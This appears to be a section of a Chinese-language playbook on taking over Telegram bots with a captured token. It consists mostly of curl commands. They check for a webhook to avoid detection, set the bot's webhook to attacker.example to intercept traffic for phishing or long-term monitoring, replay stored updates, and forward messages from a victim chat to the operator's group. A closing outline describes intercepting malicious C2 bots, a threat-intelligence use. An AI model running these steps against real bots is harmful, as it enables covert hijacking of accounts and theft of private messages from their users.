## 第 2 步: Token 接管链(控制权)

```bash
# 先评估动静,别急着拉历史
curl -s https://api.telegram.org/bot<TOKEN>/getWebhookInfo
#   ↑ 有 webhook = bot 在跑,动作大会被发现

# 静态验证身份/描述(几乎无痕)
curl -s https://api.telegram.org/bot<TOKEN>/getMe
curl -s https://api.telegram.org/bot<TOKEN>/getMyDescription   # 黑产 bot 常在此写广告/卖家 handle/面板链接

# 截流(钓鱼/长期监听场景):把自己的 webhook 设上去
curl -s -X POST https://api.telegram.org/bot<TOKEN>/setWebhook -d url=https://attacker.example/hook -d secret_token=xxx

# 不改接收端只做情报:getUpdates 回放 + forwardMessage 前转(动静最小)
curl -s "https://api.telegram.org/bot<TOKEN>/getUpdates?offset=-1000"
curl -s "https://api.telegram.org/bot<TOKEN>/forwardMessage?chat_id=<MY_GROUP>&from_chat_id=<VICTIM_CHAT>&message_id=<ID>"
# 批量: POST /forwardMessages ≤100 条/次
```

**恶意 C2 bot 专用拦截流程(ANY.RUN 方法,脚本见 anyrun/blog-scripts):**
```
① 抓样本拿 token + chat_id(可能在 URL query 或 POST body)
② getWebhookInfo → 有 webhook 先保存配置再 deleteWebhook
③ 建 TG 群、把自己设匿名、把 bot 拉进群
④ getUpdates?offset=-1 重置 → 再 getUpdates?offset=<update_id+1> 清历史
⑤ forwardMessage / forwardMessages 把运营者消息转到自己群
⑥ 完事恢复原 webhook
```

